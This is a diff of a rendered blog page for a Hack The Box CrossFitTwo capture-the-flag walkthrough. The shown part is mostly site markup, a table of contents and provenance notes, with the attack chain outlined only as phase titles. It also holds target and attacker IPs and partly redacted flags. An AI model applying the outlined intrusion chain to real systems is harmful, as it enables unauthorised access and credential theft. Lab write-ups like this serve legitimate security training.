@@ -4,8 +4,8 @@
 4:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],""]
 5:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],"MobileNavigation"]
 12:I[7123,[],"default",1]
-:HL["/_next/static/css/2377371a6300f138.css","style"]
-0:{"P":null,"c":["","writing","hackthebox-crossfittwo-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-crossfittwo-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/2377371a6300f138.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","link",null,{"rel":"alternate","type":"application/rss+xml","href":"/feed.xml","title":"CyberKareem security writing"}]}],["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"$undefined","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"$undefined"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"subpage-main","children":["$","section",null,{"className":"page-hero shell","aria-labelledby":"not-found-title","children":[["$","p",null,{"className":"page-eyebrow","children":"Error record · 404"}],["$","h1",null,{"id":"not-found-title","children":["This page has left the ",["$","em",null,{"children":"record."}]]}],["$","div",null,{"className":"page-intro-grid","children":[["$","div",null,{"className":"page-intro-copy","children":[["$","p",null,{"children":"The address may have changed, or the page may no longer be public. The research ledger and owned writing archive remain available from their permanent indexes."}],["$","div",null,{"className":"page-actions","children":[["$","$L4",null,{"className":"button button-primary","href":"/","children":["Return home ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"className":"button button-secondary","href":"/writing","children":"Browse the writing archive"}]]}]]}],["$","div",null,{"className":"contact-guardrail","role":"note","children":[["$","span",null,{"children":"Looking for evidence?"}],["$","p",null,{"children":"Open the public research ledger for current advisory and CVE records linked to their primary sources."}],["$","$L4",null,{"className":"text-link","href":"/research","children":["Open research ledger ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}]]}]]}]]}]}],["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":["$L6","$L7","$L8","$L9","$La"]}]]}]]}],"$Lb"]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],"$Lc"]}]]}]]}],{"children":["$Ld",{"children":["$Le",{"children":["$Lf",{},null,false,null]},null,false,"$@10"]},null,false,"$@10"]},null,false,null],"$L11",false]],"m":"$undefined","G":["$12",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"zs2c_HJI2CXWwLDIPVraL"}
+:HL["/_next/static/css/8149d5cedd00bf59.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-crossfittwo-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-crossfittwo-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/8149d5cedd00bf59.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","link",null,{"rel":"alternate","type":"application/rss+xml","href":"/feed.xml","title":"CyberKareem security writing"}]}],["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"$undefined","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"$undefined"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"subpage-main","children":["$","section",null,{"className":"page-hero shell","aria-labelledby":"not-found-title","children":[["$","p",null,{"className":"page-eyebrow","children":"Error record · 404"}],["$","h1",null,{"id":"not-found-title","children":["This page has left the ",["$","em",null,{"children":"record."}]]}],["$","div",null,{"className":"page-intro-grid","children":[["$","div",null,{"className":"page-intro-copy","children":[["$","p",null,{"children":"The address may have changed, or the page may no longer be public. The research ledger and owned writing archive remain available from their permanent indexes."}],["$","div",null,{"className":"page-actions","children":[["$","$L4",null,{"className":"button button-primary","href":"/","children":["Return home ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"className":"button button-secondary","href":"/writing","children":"Browse the writing archive"}]]}]]}],["$","div",null,{"className":"contact-guardrail","role":"note","children":[["$","span",null,{"children":"Looking for evidence?"}],["$","p",null,{"children":"Open the public research ledger for current advisory and CVE records linked to their primary sources."}],["$","$L4",null,{"className":"text-link","href":"/research","children":["Open research ledger ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}]]}]]}]]}]}],["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":["$L6","$L7","$L8","$L9","$La"]}]]}]]}],"$Lb"]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],"$Lc"]}]]}]]}],{"children":["$Ld",{"children":["$Le",{"children":["$Lf",{},null,false,null]},null,false,"$@10"]},null,false,"$@10"]},null,false,null],"$L11",false]],"m":"$undefined","G":["$12",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"EBRi0HxexS1XMGpfUl_9d"}
 15:I[484,[],"OutletBoundary"]
 16:"$Sreact.suspense"
 19:I[484,[],"ViewportBoundary"]
@@ -24,7 +24,7 @@ f:["$","$1","c",{"children":["$L14",null,["$","$L15",null,{"children":["$","$16"
 10:"$W18"
 11:["$","$1","h",{"children":[null,["$","$L19",null,{"children":"$L1a"}],["$","div",null,{"hidden":true,"children":["$","$L1b",null,{"children":["$","$16",null,{"name":"Next.Metadata","children":"$L1c"}]}]}],null]}]
 :HL["/writing/covers/hackthebox-crossfittwo-walkthrough.webp","image"]
-14:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":["$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:0","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:1","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:2","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:3","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:4","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:5"],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L4",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: CrossFitTwo Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box CrossFitTwo machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:37:33.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[13," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-crossfittwo-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box CrossFitTwo machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official CrossFitTwo machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/crossfittwo","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","phase-0-the-hacker-mindset-before-recon",{"children":["$","a",null,{"href":"#phase-0-the-hacker-mindset-before-recon","children":"Phase 0: The Hacker Mindset Before Recon"}]}],["$","li","phase-1-initial-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-initial-reconnaissance","children":"Phase 1: Initial Reconnaissance"}]}],["$","li","phase-2-websocket-sql-injection",{"children":["$","a",null,{"href":"#phase-2-websocket-sql-injection","children":"Phase 2: WebSocket SQL Injection"}]}],["$","li","phase-3-file-reads-and-infrastructure-mapping",{"children":["$","a",null,{"href":"#phase-3-file-reads-and-infrastructure-mapping","children":"Phase 3: File Reads & Infrastructure Mapping"}]}],["$","li","phase-4-hijacking-the-dns-resolver",{"children":["$","a",null,{"href":"#phase-4-hijacking-the-dns-resolver","children":"Phase 4: Hijacking the DNS Resolver"}]}],"$L1d","$L1e","$L1f","$L20","$L21","$L22","$L23"]}]]}],"$L24"],"$L25","$L26",["$L27","$L28","$L29"]]}],"$L2a"]}]]}],"$L2b"]}],"$L2c","$L2d"]
+14:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":["$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:0","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:1","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:2","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:3","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:4","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:5"],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L4",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: CrossFitTwo Walkthrough"}],["$","p",null,{"className":"article-dek","children":"WebSocket SQL injection enables DNS rebinding that steals a user's chat credentials, then Node.js module hijacking and a SUID file reader expose YubiKey material and a backed-up root SSH key."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:37:33.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[9," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-crossfittwo-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box CrossFitTwo machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official CrossFitTwo machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/crossfittwo","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","phase-0-before-recon",{"children":["$","a",null,{"href":"#phase-0-before-recon","children":"Phase 0: Before Recon"}]}],["$","li","phase-1-initial-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-initial-reconnaissance","children":"Phase 1: Initial Reconnaissance"}]}],["$","li","phase-2-websocket-sql-injection",{"children":["$","a",null,{"href":"#phase-2-websocket-sql-injection","children":"Phase 2: WebSocket SQL Injection"}]}],["$","li","phase-3-file-reads-and-infrastructure-mapping",{"children":["$","a",null,{"href":"#phase-3-file-reads-and-infrastructure-mapping","children":"Phase 3: File Reads & Infrastructure Mapping"}]}],["$","li","phase-4-hijacking-the-dns-resolver",{"children":["$","a",null,{"href":"#phase-4-hijacking-the-dns-resolver","children":"Phase 4: Hijacking the DNS Resolver"}]}],"$L1d","$L1e","$L1f","$L20","$L21","$L22","$L23"]}]]}],"$L24"],"$L25","$L26",["$L27","$L28","$L29"]]}],"$L2a"]}]]}],"$L2b"]}],"$L2c","$L2d"]
 1d:["$","li","phase-5-dns-rebinding-and-cors-bypass",{"children":["$","a",null,{"href":"#phase-5-dns-rebinding-and-cors-bypass","children":"Phase 5: DNS Rebinding & CORS Bypass"}]}]
 1e:["$","li","phase-6-socket-io-message-hijacking",{"children":["$","a",null,{"href":"#phase-6-socket-io-message-hijacking","children":"Phase 6: Socket.io Message Hijacking"}]}]
 1f:["$","li","phase-7-shell-as-david",{"children":["$","a",null,{"href":"#phase-7-shell-as-david","children":"Phase 7: Shell as David"}]}]
@@ -32,40 +32,39 @@ f:["$","$1","c",{"children":["$L14",null,["$","$L15",null,{"children":["$","$16"
 21:["$","li","phase-9-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-9-privilege-escalation-to-root","children":"Phase 9: Privilege Escalation to Root"}]}]
 22:["$","li","phase-10-root-shell",{"children":["$","a",null,{"href":"#phase-10-root-shell","children":"Phase 10: Root Shell"}]}]
 23:["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}]
-24:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",12," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","phase-0-the-hacker-mindset-before-recon",{"children":["$","a",null,{"href":"#phase-0-the-hacker-mindset-before-recon","children":"Phase 0: The Hacker Mindset Before Recon"}]}],["$","li","phase-1-initial-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-initial-reconnaissance","children":"Phase 1: Initial Reconnaissance"}]}],["$","li","phase-2-websocket-sql-injection",{"children":["$","a",null,{"href":"#phase-2-websocket-sql-injection","children":"Phase 2: WebSocket SQL Injection"}]}],["$","li","phase-3-file-reads-and-infrastructure-mapping",{"children":["$","a",null,{"href":"#phase-3-file-reads-and-infrastructure-mapping","children":"Phase 3: File Reads & Infrastructure Mapping"}]}],["$","li","phase-4-hijacking-the-dns-resolver",{"children":["$","a",null,{"href":"#phase-4-hijacking-the-dns-resolver","children":"Phase 4: Hijacking the DNS Resolver"}]}],["$","li","phase-5-dns-rebinding-and-cors-bypass",{"children":["$","a",null,{"href":"#phase-5-dns-rebinding-and-cors-bypass","children":"Phase 5: DNS Rebinding & CORS Bypass"}]}],["$","li","phase-6-socket-io-message-hijacking",{"children":["$","a",null,{"href":"#phase-6-socket-io-message-hijacking","children":"Phase 6: Socket.io Message Hijacking"}]}],["$","li","phase-7-shell-as-david",{"children":["$","a",null,{"href":"#phase-7-shell-as-david","children":"Phase 7: Shell as David"}]}],["$","li","phase-8-pivot-to-john-nodejs-module-hijacking",{"children":["$","a",null,{"href":"#phase-8-pivot-to-john-nodejs-module-hijacking","children":"Phase 8: Pivot to John (NodeJS Module Hijacking)"}]}],["$","li","phase-9-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-9-privilege-escalation-to-root","children":"Phase 9: Privilege Escalation to Root"}]}],["$","li","phase-10-root-shell",{"children":["$","a",null,{"href":"#phase-10-root-shell","children":"Phase 10: Root Shell"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}]]}]}]]}]
-25:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/004b6af9d0278d51ebce2fd0bd0346dfddb21cdb/HTB-CrossFitTwo.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 004b6af9d027",""]}]]]}]
-26:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["CrossFitTwo"," · OpenBSD"," · Insane"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/crossfittwo","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+24:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",12," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","phase-0-before-recon",{"children":["$","a",null,{"href":"#phase-0-before-recon","children":"Phase 0: Before Recon"}]}],["$","li","phase-1-initial-reconnaissance",{"children":["$","a",null,{"href":"#phase-1-initial-reconnaissance","children":"Phase 1: Initial Reconnaissance"}]}],["$","li","phase-2-websocket-sql-injection",{"children":["$","a",null,{"href":"#phase-2-websocket-sql-injection","children":"Phase 2: WebSocket SQL Injection"}]}],["$","li","phase-3-file-reads-and-infrastructure-mapping",{"children":["$","a",null,{"href":"#phase-3-file-reads-and-infrastructure-mapping","children":"Phase 3: File Reads & Infrastructure Mapping"}]}],["$","li","phase-4-hijacking-the-dns-resolver",{"children":["$","a",null,{"href":"#phase-4-hijacking-the-dns-resolver","children":"Phase 4: Hijacking the DNS Resolver"}]}],["$","li","phase-5-dns-rebinding-and-cors-bypass",{"children":["$","a",null,{"href":"#phase-5-dns-rebinding-and-cors-bypass","children":"Phase 5: DNS Rebinding & CORS Bypass"}]}],["$","li","phase-6-socket-io-message-hijacking",{"children":["$","a",null,{"href":"#phase-6-socket-io-message-hijacking","children":"Phase 6: Socket.io Message Hijacking"}]}],["$","li","phase-7-shell-as-david",{"children":["$","a",null,{"href":"#phase-7-shell-as-david","children":"Phase 7: Shell as David"}]}],["$","li","phase-8-pivot-to-john-nodejs-module-hijacking",{"children":["$","a",null,{"href":"#phase-8-pivot-to-john-nodejs-module-hijacking","children":"Phase 8: Pivot to John (NodeJS Module Hijacking)"}]}],["$","li","phase-9-privilege-escalation-to-root",{"children":["$","a",null,{"href":"#phase-9-privilege-escalation-to-root","children":"Phase 9: Privilege Escalation to Root"}]}],["$","li","phase-10-root-shell",{"children":["$","a",null,{"href":"#phase-10-root-shell","children":"Phase 10: Root Shell"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}]]}]}]]}]
+25:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/004b6af9d0278d51ebce2fd0bd0346dfddb21cdb/HTB-CrossFitTwo.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 004b6af9d027",""]}]]]}]
+26:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["CrossFitTwo, OpenBSD, Insane",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/crossfittwo","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 27:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box CrossFitTwo machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-28:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-29:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"11 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-2e:T67b0,
-<blockquote>
-<p><strong>Target:</strong> 10.129.7.130<br /><strong>Attacker:</strong> 10.10.16.84<br /><strong>OS:</strong> OpenBSD<br /><strong>Difficulty:</strong> Insane<br /><strong>Flags:</strong></p>
+28:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+29:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"10 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+2e:T55e6,<blockquote>
+<p><strong>Target:</strong> 10.129.7.130<br><strong>Attacker:</strong> 10.10.16.84<br><strong>OS:</strong> OpenBSD<br><strong>Difficulty:</strong> Insane<br><strong>Flags:</strong></p>
 <ul>
 <li>User: <code>652b401[redacted]1f43fb3ade</code></li>
 <li>Root: <code>6fbc09c[redacted]3d5376dd3a</code></li>
 </ul>
 </blockquote>
-<hr />
+<hr>
 
 
 
-<h2 id="phase-0-the-hacker-mindset-before-recon">Phase 0: The Hacker Mindset Before Recon</h2>
-<p><strong>Mindset:</strong> <em>"Every system is a graph of interconnected services. My job is to map the graph, find the weakest node, and turn one compromise into the next."</em></p>
-<p>Before touching the target, we establish:</p>
